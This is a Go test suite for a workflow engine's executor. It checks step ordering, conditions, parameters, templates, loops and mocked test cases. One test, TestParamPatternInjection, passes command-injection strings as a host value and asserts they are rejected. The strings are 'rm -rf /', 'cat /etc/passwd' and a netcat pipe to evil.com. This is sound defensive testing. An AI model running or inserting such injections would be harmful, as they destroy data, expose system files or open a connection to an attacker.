package engine

import (
	"context"
	"io"
	"log/slog"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/suite"
	"github.com/tailflow/tailflow/internal/action"
	"github.com/tailflow/tailflow/internal/event"
	"github.com/tailflow/tailflow/internal/parser"
	"github.com/tailflow/tailflow/internal/runtime"
)

// eventCollector accumulates values emitted on the event bus from a subscriber
// goroutine while letting the test body read them safely. The mutex guards the
// slice against the goroutine still appending later events when the body reads.
type eventCollector[T any] struct {
	mu    sync.Mutex
	items []T
	count atomic.Int32
}

func (c *eventCollector[T]) add(item T) {
	c.mu.Lock()
	c.items = append(c.items, item)
	c.mu.Unlock()
	c.count.Add(1)
}

func (c *eventCollector[T]) load() int32 {
	return c.count.Load()
}

func (c *eventCollector[T]) snapshot() []T {
	c.mu.Lock()
	defer c.mu.Unlock()

	out := make([]T, len(c.items))
	copy(out, c.items)

	return out
}

func newTestExecutor() (*Executor, *event.Bus) {
	bus := event.NewBus()
	reg := action.NewRegistry()
	action.RegisterBuiltins(reg)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	return NewExecutor(reg, bus, logger, nil, nil, nil), bus
}

type EngineTestSuite struct {
	suite.Suite
}

func TestEngine(t *testing.T) {
	suite.Run(t, new(EngineTestSuite))
}

func (s *EngineTestSuite) SetupTest() {}

func (s *EngineTestSuite) TestSimpleWorkflow() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test",
		Steps: []parser.Step{
			{
				ID:     "log1",
				Action: "log",
				Config: map[string]any{"message": "hello"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["log1"].Status)
}

func (s *EngineTestSuite) TestParallelSteps() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Two independent steps that should run in parallel
	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "parallel",
		Steps: []parser.Step{
			{
				ID:     "a",
				Action: "delay",
				Config: map[string]any{"duration": "50ms"},
			},
			{
				ID:     "b",
				Action: "delay",
				Config: map[string]any{"duration": "50ms"},
			},
			{
				ID:        "c",
				Action:    "log",
				DependsOn: []string{"a", "b"},
				Config:    map[string]any{"message": "done"},
			},
		},
	}

	start := time.Now()
	result, err := exec.Execute(context.Background(), wf, nil)
	elapsed := time.Since(start)

	s.Require().NoError(err)
	s.Equal("success", result.Status)
	// If parallel, should take ~50ms not ~100ms
	s.Less(elapsed, 150*time.Millisecond)
}

func (s *EngineTestSuite) TestWhenCondition() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "conditional",
		Params:  []parser.Param{{Name: "skip", Type: "bool", Default: true}},
		Steps: []parser.Step{
			{
				ID:     "maybe",
				Action: "log",
				When:   "params.skip == false",
				Config: map[string]any{"message": "should not run"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("skipped", result.Steps["maybe"].Status)
}

func (s *EngineTestSuite) TestWhenConditionTrue() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "conditional-true",
		Params:  []parser.Param{{Name: "run", Type: "bool", Default: true}},
		Steps: []parser.Step{
			{
				ID:     "maybe",
				Action: "log",
				When:   "params.run == true",
				Config: map[string]any{"message": "should run"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["maybe"].Status)
}

func (s *EngineTestSuite) TestParamDefaults() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "params",
		Params: []parser.Param{
			{Name: "env", Type: "string", Default: "staging"},
		},
		Steps: []parser.Step{
			{
				ID:     "log1",
				Action: "log",
				Config: map[string]any{"message": "env={{ params.env }}"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestRequiredParamMissing() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "params",
		Params: []parser.Param{
			{Name: "env", Type: "string", Required: true},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "test"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, nil)
	s.Error(err)
	s.Contains(err.Error(), "required parameter")
}

func (s *EngineTestSuite) TestParamPatternValid() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "pattern-test",
		Params: []parser.Param{
			{Name: "host", Type: "string", Pattern: "[a-zA-Z0-9._-]+"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "{{ params.host }}"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestParamPatternInjection() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "pattern-test",
		Params: []parser.Param{
			{Name: "host", Type: "string", Pattern: "[a-zA-Z0-9._-]+"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "{{ params.host }}"}},
		},
	}

	// Injection attempt with &&
	_, err := exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr && rm -rf /"})
	s.Error(err)
	s.Contains(err.Error(), "does not match pattern")

	// Injection attempt with ;
	_, err = exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr; cat /etc/passwd"})
	s.Error(err)
	s.Contains(err.Error(), "does not match pattern")

	// Injection attempt with |
	_, err = exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr | nc evil.com 4444"})
	s.Error(err)
	s.Contains(err.Error(), "does not match pattern")
}

func (s *EngineTestSuite) TestDAGDependencies() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Track execution order
	var order eventCollector[string]

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type == event.StepCompleted {
				order.add(ev.StepID)
			}
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "dag",
		Steps: []parser.Step{
			{ID: "a", Action: "set", Config: map[string]any{"val": "a"}},
			{ID: "b", Action: "set", DependsOn: []string{"a"}, Config: map[string]any{"val": "b"}},
			{ID: "c", Action: "set", DependsOn: []string{"b"}, Config: map[string]any{"val": "c"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)

	// Wait for all 3 StepCompleted events to be collected
	s.Eventually(func() bool {
		return order.load() >= 3
	}, 2*time.Second, 10*time.Millisecond)

	// a must come before b, b before c
	aIdx, bIdx, cIdx := -1, -1, -1
	for i, id := range order.snapshot() {
		switch id {
		case "a":
			aIdx = i
		case "b":
			bIdx = i
		case "c":
			cIdx = i
		}
	}
	s.Less(aIdx, bIdx)
	s.Less(bIdx, cIdx)
}

func (s *EngineTestSuite) TestTemplateResolution() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "templates",
		Params:  []parser.Param{{Name: "name", Type: "string", Default: "World"}},
		Steps: []parser.Step{
			{
				ID:     "greet",
				Action: "log",
				Config: map[string]any{"message": "Hello, {{ params.name }}!"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestEventsPublished() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	ch := bus.Subscribe(100)

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "events",
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "hi"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)

	// Wait for all expected event types to be published
	var events []event.Event
	s.Eventually(func() bool {
		for {
			select {
			case e := <-ch:
				events = append(events, e)
			default:
				types := make(map[event.EventType]bool)
				for _, e := range events {
					types[e.Type] = true
				}
				return types[event.WorkflowStarted] &&
					types[event.StepStarted] &&
					types[event.StepCompleted] &&
					types[event.WorkflowCompleted]
			}
		}
	}, 2*time.Second, 10*time.Millisecond)
}

func (s *EngineTestSuite) TestEnvResolution() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "env-test",
		Params:  []parser.Param{{Name: "region", Type: "string", Default: "us-east"}},
		Env:     map[string]string{"API_URL": "https://api.{{ params.region }}.example.com"},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "{{ env.API_URL }}"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestCancelledContext() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel immediately

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "cancel",
		Steps: []parser.Step{
			{ID: "s1", Action: "delay", Config: map[string]any{"duration": "10s"}},
		},
	}

	result, err := exec.Execute(ctx, wf, nil)
	s.Require().NoError(err)
	s.Equal("cancelled", result.Status)
}

// TestExecuteWithOptions covers the ExecuteOptions branches:
// - Pre-generated ExecutionID
// - TriggerData injection
// - Services injection
func (s *EngineTestSuite) TestExecuteWithOptions() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "opts-test",
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "hi"}},
		},
	}

	opts := ExecuteOptions{
		ExecutionID: "custom-exec-id-123",
		TriggerData: map[string]any{"method": "POST", "path": "/webhook"},
		Services:    nil, // Services is typically non-nil in server mode, but nil is fine for coverage
	}

	result, err := exec.Execute(context.Background(), wf, nil, opts)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("custom-exec-id-123", result.ExecutionID)
}

// TestExecuteWithServicesOption covers the Services injection branch.
func (s *EngineTestSuite) TestExecuteWithServicesOption() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "services-test",
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "hi"}},
		},
	}

	// Use a non-nil Services to cover that branch
	opts := ExecuteOptions{
		Services: &runtime.ActionServices{},
	}

	result, err := exec.Execute(context.Background(), wf, nil, opts)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

// TestExtraParams covers the extra params branch (params not declared in wf.Params).
func (s *EngineTestSuite) TestExtraParams() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "extra-params",
		Params: []parser.Param{
			{Name: "declared", Type: "string", Default: "default-val"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "{{ params.extra }}"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, map[string]any{
		"extra": "bonus-value",
	})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

// TestParamPatternNotProvided covers the case where a param has a pattern
// but the param value is not provided (and not required), so the pattern
// validation is skipped.
func (s *EngineTestSuite) TestParamPatternNotProvided() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "pattern-not-provided",
		Params: []parser.Param{
			{Name: "host", Type: "string", Pattern: "[a-z]+"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "no host"}},
		},
	}

	// Don't provide the "host" param at all
	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

// TestParamPatternNonString covers the case where a param has a pattern
// but the provided value is not a string (e.g. int), so the pattern check is skipped.
func (s *EngineTestSuite) TestParamPatternNonString() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "pattern-non-string",
		Params: []parser.Param{
			{Name: "count", Type: "int", Pattern: "[0-9]+"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "count is set"}},
		},
	}

	// Provide an integer instead of a string
	result, err := exec.Execute(context.Background(), wf, map[string]any{"count": 42})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

// TestInvalidPatternRegex covers the case where the pattern itself is not a valid regex.
func (s *EngineTestSuite) TestInvalidPatternRegex() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "invalid-pattern",
		Params: []parser.Param{
			{Name: "host", Type: "string", Pattern: "[invalid(regex"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "test"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, map[string]any{"host": "test"})
	s.Error(err)
	s.Contains(err.Error(), "invalid pattern")
}

// TestEnvResolutionError covers the error branch in env variable resolution.
func (s *EngineTestSuite) TestEnvResolutionError() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "env-error",
		Env:     map[string]string{"BAD": "{{ invalid syntax === }}"},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "test"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, nil)
	s.Error(err)
	s.Contains(err.Error(), "resolve env")
}

// TestBuildDAGError covers the DAG build error branch (unknown dependency).
func (s *EngineTestSuite) TestBuildDAGError() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "dag-error",
		Steps: []parser.Step{
			{ID: "s1", Action: "log", DependsOn: []string{"nonexistent"}, Config: map[string]any{"message": "test"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, nil)
	s.Error(err)
	s.Contains(err.Error(), "build DAG")
}

// TestUnknownAction covers the branch where a step references an unregistered action.
func (s *EngineTestSuite) TestUnknownAction() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "unknown-action",
		Steps: []parser.Step{
			{ID: "s1", Action: "nonexistent_action", Config: map[string]any{}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

// TestActionValidateError covers the branch where a step's action Validate returns an error.
func (s *EngineTestSuite) TestActionValidateError() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// The "log" action requires a "message" config key. Omitting it should fail validation.
	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "validate-error",
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

// TestWhenConditionError covers the branch where the when expression evaluation fails.
func (s *EngineTestSuite) TestWhenConditionError() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "when-error",
		Steps: []parser.Step{
			{
				ID:     "s1",
				Action: "log",
				When:   "invalid syntax ===",
				Config: map[string]any{"message": "test"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

// TestResolveConfigError covers the branch where config template resolution fails.
func (s *EngineTestSuite) TestResolveConfigError() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "resolve-config-error",
		Steps: []parser.Step{
			{
				ID:     "s1",
				Action: "log",
				Config: map[string]any{"message": "{{ invalid syntax === }}"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

// TestHasFailedStepsAllSuccess verifies hasFailedSteps returns false when all steps succeed.
// This is implicitly tested via a fully successful workflow.
func (s *EngineTestSuite) TestHasFailedStepsAllSuccess() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "all-success",
		OnError: []parser.Step{
			{ID: "cleanup", Action: "set", Config: map[string]any{"ran": true}},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "ok"}},
			{ID: "s2", Action: "log", DependsOn: []string{"s1"}, Config: map[string]any{"message": "ok2"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.False(result.HasErrors)
	// on_error should NOT have run
	_, exists := result.Steps["cleanup"]
	s.False(exists)
}

// TestTriggerDataInStepInput covers the trigger data in step input event emission.
func (s *EngineTestSuite) TestTriggerDataInStepInput() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	ch := bus.Subscribe(100)

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "trigger-input",
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "hi"}},
		},
	}

	opts := ExecuteOptions{
		TriggerData: map[string]any{"method": "POST", "path": "/hook"},
	}

	result, err := exec.Execute(context.Background(), wf, nil, opts)
	s.Require().NoError(err)
	s.Equal("success", result.Status)

	// Verify a StepInput event includes trigger data
	var found bool
	s.Eventually(func() bool {
		for {
			select {
			case ev := <-ch:
				if ev.Type == event.StepInput && ev.Data != nil {
					_, ok := ev.Data["trigger"]
					if ok {
						found = true
						return true
					}
				}
			default:
				return found
			}
		}
	}, 2*time.Second, 10*time.Millisecond)
	s.True(found)
}

// TestLoopActionConfigDeferred covers the engine's special handling of loop action's
// action_config key — it must be kept unresolved until the loop action resolves it.
func (s *EngineTestSuite) TestLoopActionConfigDeferred() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "loop-action-config",
		Steps: []parser.Step{
			{
				ID:     "prepare",
				Action: "set",
				Config: map[string]any{
					"items": []any{"a", "b"},
				},
			},
			{
				ID:        "loop_step",
				Action:    "loop",
				DependsOn: []string{"prepare"},
				Config: map[string]any{
					"items": "{{ vars.items }}",
					"as":    "item",
					"action_config": map[string]any{
						"val": "{{ loop.item }}",
					},
					"action": "set",
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["loop_step"].Status)
}

// TestLoopRunActionResolveConfigError covers the RunAction closure's config
// resolution error path (engine.go line 519-521).
func (s *EngineTestSuite) TestLoopRunActionResolveConfigError() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "loop-resolve-error",
		Steps: []parser.Step{
			{
				ID:     "prepare",
				Action: "set",
				Config: map[string]any{
					"items": []any{"x"},
				},
			},
			{
				ID:        "loop_step",
				Action:    "loop",
				DependsOn: []string{"prepare"},
				Config: map[string]any{
					"items":  "{{ vars.items }}",
					"as":     "item",
					"action": "set",
					"action_config": map[string]any{
						"val": "{{ invalid syntax === }}",
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

// TestLoopRunActionUnknownAction covers the RunAction closure's unknown action
// error path (engine.go line 525-527).
func (s *EngineTestSuite) TestLoopRunActionUnknownAction() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "loop-unknown-action",
		Steps: []parser.Step{
			{
				ID:     "prepare",
				Action: "set",
				Config: map[string]any{
					"items": []any{"x"},
				},
			},
			{
				ID:        "loop_step",
				Action:    "loop",
				DependsOn: []string{"prepare"},
				Config: map[string]any{
					"items":         "{{ vars.items }}",
					"as":            "item",
					"action":        "nonexistent_action_xyz",
					"action_config": map[string]any{},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

// TestLoopRunActionValidateError covers the RunAction closure's validate error
// path (engine.go line 541-543).
func (s *EngineTestSuite) TestLoopRunActionValidateError() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "loop-validate-error",
		Steps: []parser.Step{
			{
				ID:     "prepare",
				Action: "set",
				Config: map[string]any{
					"items": []any{"x"},
				},
			},
			{
				ID:        "loop_step",
				Action:    "loop",
				DependsOn: []string{"prepare"},
				Config: map[string]any{
					"items":  "{{ vars.items }}",
					"as":     "item",
					"action": "log",
					"action_config": map[string]any{
						// "log" action requires "message" — omitting it causes validate error
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTestMode_MockOutput() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-mock",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "should not run"},
				Testing: []parser.TestCase{
					{Name: "happy", Output: map[string]any{"mocked": true}},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "happy"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["step1"].Status)

	outMap, ok := result.Steps["step1"].Output.(map[string]any)
	s.Require().True(ok)
	s.Equal(true, outMap["mocked"])
}

func (s *EngineTestSuite) TestTestMode_MockError() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-mock-error",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "should not run"},
				Testing: []parser.TestCase{
					{Name: "err-case", Error: &parser.TestCaseError{Message: "connection refused", Code: "db_error"}},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "err-case"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
	s.Equal("failed", result.Steps["step1"].Status)
	s.Equal("connection refused", result.Steps["step1"].Error.Message)
	s.Equal("db_error", result.Steps["step1"].Error.Code)
}

func (s *EngineTestSuite) TestTestMode_MockErrorWithContinuePolicy() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-mock-continue",
		Steps: []parser.Step{
			{
				ID:          "step1",
				Action:      "log",
				Config:      map[string]any{"message": "should not run"},
				ErrorPolicy: "continue",
				Testing: []parser.TestCase{
					{Name: "err-case", Error: &parser.TestCaseError{Message: "soft fail"}},
				},
			},
			{
				ID:        "step2",
				Action:    "log",
				DependsOn: []string{"step1"},
				Config:    map[string]any{"message": "runs after error"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "err-case"})
	s.Require().NoError(err)
	s.Equal("failed", result.Steps["step1"].Status)
	s.Equal("success", result.Steps["step2"].Status)
}

func (s *EngineTestSuite) TestTestMode_NoMatchingCase_RunsNormally() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-no-case",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "runs normally"},
				Testing: []parser.TestCase{
					{Name: "other-case", Output: map[string]any{"mocked": true}},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "unknown-case"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["step1"].Status)
}

func (s *EngineTestSuite) TestTestMode_Cascade() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-cascade",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "mocked"},
				Testing: []parser.TestCase{
					{Name: "cascade", Output: map[string]any{"value": 42}},
				},
			},
			{
				ID:        "step2",
				Action:    "set",
				DependsOn: []string{"step1"},
				Config: map[string]any{
					"key":   "result",
					"value": "{{ steps.step1.output.value }}",
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "cascade"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["step1"].Status)

	outMap, ok := result.Steps["step1"].Output.(map[string]any)
	s.Require().True(ok)
	s.Equal(42, outMap["value"])

	s.Equal("success", result.Steps["step2"].Status)
}

func (s *EngineTestSuite) TestTestMode_WhenConditionSkipsBeforeMock() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-when-mock",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				When:   "false",
				Config: map[string]any{"message": "should not run"},
				Testing: []parser.TestCase{
					{Name: "case1", Output: map[string]any{"mocked": true}},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "case1"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("skipped", result.Steps["step1"].Status)
}

func (s *EngineTestSuite) TestTestMode_ExpectStatusPass() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-expect",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "set",
				Config: map[string]any{
					"key":   "result",
					"value": 42,
				},
				Testing: []parser.TestCase{
					{
						Name: "check",
						Expect: &parser.TestCaseExpect{
							Status: "success",
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "check"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestTestMode_ExpectStatusFail() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-expect-fail",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hello"},
				Testing: []parser.TestCase{
					{
						Name: "wrong-status",
						Expect: &parser.TestCaseExpect{
							Status: "failed",
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "wrong-status"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTestMode_ExpectOutputMismatch() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-expect-output-mismatch",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hello"},
				Testing: []parser.TestCase{
					{
						Name: "mismatch",
						Expect: &parser.TestCaseExpect{
							Output: map[string]any{"nonexistent_key": "value"},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "mismatch"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTestMode_MockOutputWithExpect() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-mock-and-expect",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "should not run"},
				Testing: []parser.TestCase{
					{
						Name:   "mock-expect",
						Output: map[string]any{"result": 42, "extra": "data"},
						Expect: &parser.TestCaseExpect{
							Output: map[string]any{"result": 42},
							Status: "success",
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "mock-expect"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["step1"].Status)

	outMap, ok := result.Steps["step1"].Output.(map[string]any)
	s.Require().True(ok)
	s.Equal(42, outMap["result"])
}

func (s *EngineTestSuite) TestTestMode_MockErrorDefaultCode() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-default-code",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hi"},
				Testing: []parser.TestCase{
					{Name: "err", Error: &parser.TestCaseError{Message: "boom"}},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "err"})
	s.Require().NoError(err)
	s.Equal("failed", result.Steps["step1"].Status)
	s.Equal("action_failed", result.Steps["step1"].Error.Code)
}

func (s *EngineTestSuite) TestTestMode_ExpectErrorMatch() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Step that fails with a known error, and expect matches it
	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-expect-error",
		Steps: []parser.Step{
			{
				ID:          "step1",
				Action:      "log",
				Config:      map[string]any{"message": "hi"},
				ErrorPolicy: "continue",
				Testing: []parser.TestCase{
					{
						Name:  "err-match",
						Error: &parser.TestCaseError{Message: "db down", Code: "db_error"},
						Expect: &parser.TestCaseExpect{
							Status: "failed",
							Error:  &parser.TestCaseError{Message: "db down", Code: "db_error"},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "err-match"})
	s.Require().NoError(err)
	// error_policy=continue so workflow doesn't fail, but step is failed
	s.Equal("failed", result.Steps["step1"].Status)
}

